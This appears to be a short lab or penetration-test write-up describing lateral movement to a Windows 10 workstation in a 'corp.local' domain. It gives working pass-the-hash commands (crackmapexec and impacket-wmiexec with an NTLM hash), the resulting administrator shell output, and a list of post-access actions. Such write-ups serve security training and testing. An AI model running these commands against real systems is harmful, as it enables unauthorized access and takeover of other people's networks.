
# 🔄 Lateral Movement to WIN10-CLIENT

## Objective
Use Pass-the-Hash technique to move laterally to the Windows 10 workstation.

## Commands Used
```bash
# Pass-the-Hash to WIN10
crackmapexec smb 192.168.56.20 -u 'Administrator' -H '6de00c52dbabb0e95c074e3006fcf36e' -d 'corp.local'

# Get interactive shell
impacket-wmiexec -hashes :6de00c52dbabb0e95c074e3006fcf36e corp.local/Administrator@192.168.56.20
Shell Access
text
C:\> whoami
corp\administrator

C:\> ipconfig
IPv4 Address: 192.168.56.20

C:\> query user
USERNAME    SESSIONNAME    ID    STATE
administrator    console    1    Active
Actions Performed on WIN10
Checked network connections

Enumerated running processes

Verified domain trust

Confirmed no additional security controls

📸 Evidence
https://screenshots/wmiexec-shell.png
